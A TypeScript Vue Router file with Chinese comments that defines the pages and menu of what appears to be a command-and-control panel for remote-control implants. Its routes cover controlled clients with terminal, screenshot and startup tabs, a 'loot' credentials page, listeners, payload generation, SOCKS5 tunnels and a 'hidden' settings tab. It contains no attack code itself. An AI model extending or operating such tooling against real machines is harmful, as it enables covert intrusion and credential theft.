import type { RouteRecordRaw } from 'vue-router'
import { Perm } from '@/utils/permiss'

/**
 * 应用路由表 = 页面入口 + 顶栏菜单的唯一来源。
 *
 * 约定（对齐 vshell IA）：
 * - meta.menu !== false → 进顶栏（8 项平铺，无下拉）；隐藏路由从数据行/页面内进入
 * - meta.permiss → 路由守卫 RBAC（见 router/index.ts）+ 顶栏过滤
 * - meta.keepAlive → 顶栏标签切换时保留页面状态（需组件名与 route.name 一致）
 * - meta.icon → 顶栏图标（内联 Iconify 名，见 layout-vshell/vs-icons.ts）
 */
export interface AppRouteMeta {
  title: string
  titleEn: string
  icon?: string
  permiss?: string
  keepAlive?: boolean
  menu?: boolean
  /** 参数化路由进菜单时的具体落地路径（如 /setting/:tab? → /setting/config） */
  menuPath?: string
  /** 决定「是否新建页面实例」的参数名；页内页签类参数不列入（避免切页签重挂整页） */
  keyParams?: string[]
}

export const BUSINESS_ROUTES: RouteRecordRaw[] = [
  { path: '', redirect: '/dashboard' },
  {
    path: 'dashboard',
    name: 'Dashboard',
    component: () => import('@/layout-vshell/VsDashboard.vue'),
    meta: { title: '仪表盘', titleEn: 'Dashboard', icon: 'tachometer-alt', permiss: Perm.SystemView, keepAlive: true } satisfies AppRouteMeta,
  },

  // ---- 客户端 ----
  {
    path: 'client',
    name: 'ClientList',
    component: () => import('@/layout/SessionTable.vue'),
    meta: { title: '客户端管理', titleEn: 'Clients', icon: 'desktop', permiss: Perm.ClientControl } satisfies AppRouteMeta,
  },
  {
    path: 'client/:uid/:func?',
    name: 'ClientDetail',
    component: () => import('@/views/client/ClientDetail.vue'),
    meta: { title: '客户端管理', titleEn: 'Clients', icon: 'desktop', permiss: Perm.ClientControl, keepAlive: true, menu: false, keyParams: ['uid'] } satisfies AppRouteMeta,
  },
  {
    path: 'loot',
    name: 'Credentials',
    component: () => import('@/layout/CredentialsView.vue'),
    meta: { title: '密码凭证', titleEn: 'Credentials', icon: 'key', permiss: Perm.ClientControl, menu: false } satisfies AppRouteMeta,
  },
  {
    path: 'tasks',
    name: 'BatchTasks',
    component: () => import('@/layout/BatchTasksView.vue'),
    meta: { title: '任务中心', titleEn: 'Task Center', permiss: Perm.ClientControl, menu: false } satisfies AppRouteMeta,
  },

  // ---- 监听 ----
  {
    path: 'listener',
    name: 'Listeners',
    component: () => import('@/views/listener/listener.vue'),
    meta: { title: '监听管理', titleEn: 'Listeners', icon: 'headphones', permiss: Perm.ClientControl } satisfies AppRouteMeta,
  },

  // ---- 客户端生成（含投递页签）----
  {
    path: 'download',
    name: 'PayloadGen',
    component: () => import('@/views/server/ServerGen.vue'),
    meta: { title: '客户端生成', titleEn: 'Payloads', icon: 'download', permiss: Perm.PayloadGen } satisfies AppRouteMeta,
  },

  // ---- 插件运行（含脚本页签）----
  {
    path: 'pluginrunner',
    name: 'Plugins',
    component: () => import('@/views/plugins/PluginsView.vue'),
    meta: { title: '插件运行', titleEn: 'Plugins', icon: 'action', permiss: Perm.PayloadGen } satisfies AppRouteMeta,
  },

  // ---- 隧道代理（含 SOCKS5 页签）----
  {
    path: 'tunnel',
    name: 'Tunnel',
    component: () => import('@/views/tunnel/TunnelProxy.vue'),
    meta: { title: '隧道代理', titleEn: 'Tunnels', icon: 'globe', permiss: Perm.PayloadGen } satisfies AppRouteMeta,
  },

  // ---- 系统设置（页内 8 个页签）----
  {
    path: 'setting/:tab?',
    name: 'Settings',
    component: () => import('@/views/settings/SettingsView.vue'),
    meta: { title: '系统设置', titleEn: 'Settings', icon: 'gear', permiss: Perm.SystemView, menuPath: '/setting/config' } satisfies AppRouteMeta,
  },

  // ---- 关于 ----
  {
    path: 'about',
    name: 'About',
    component: () => import('@/views/about/AboutView.vue'),
    meta: { title: '关于', titleEn: 'About', icon: 'info-circle', permiss: Perm.SystemView } satisfies AppRouteMeta,
  },
]

/** 顶栏菜单项（由路由表派生，保持顺序；meta.menu === false 的隐藏） */
export interface MenuItem {
  name: string
  path: string
  title: string
  titleEn: string
  icon?: string
  permiss?: string
}

export function deriveMenu(): MenuItem[] {
  return BUSINESS_ROUTES.filter((r) => r.meta && (r.meta as unknown as AppRouteMeta).menu !== false && r.name).map((r) => {
    const m = r.meta as unknown as AppRouteMeta
    return {
      name: String(r.name),
      path: m.menuPath || '/' + String(r.path),
      title: m.title,
      titleEn: m.titleEn,
      icon: m.icon,
      permiss: m.permiss,
    }
  })
}

/** 客户端详情页的功能页签（与路由 /client/:uid/:func 的 func 对应） */
export const CLIENT_FUNCS = [
  'console',
  'files',
  'process',
  'screenshot',
  'monitor',
  'terminal',
  'toolbox',
  'startup',
  'downloads',
] as const
export type ClientFunc = (typeof CLIENT_FUNCS)[number]

/** 系统设置页的页签（与路由 /setting/:tab 的 tab 对应） */
export const SETTING_TABS = [
  'config',
  'account',
  'backup',
  'status',
  'users',
  'keys',
  'security',
  'hidden',
  'logs',
  'pool',
] as const
export type SettingTab = (typeof SETTING_TABS)[number]

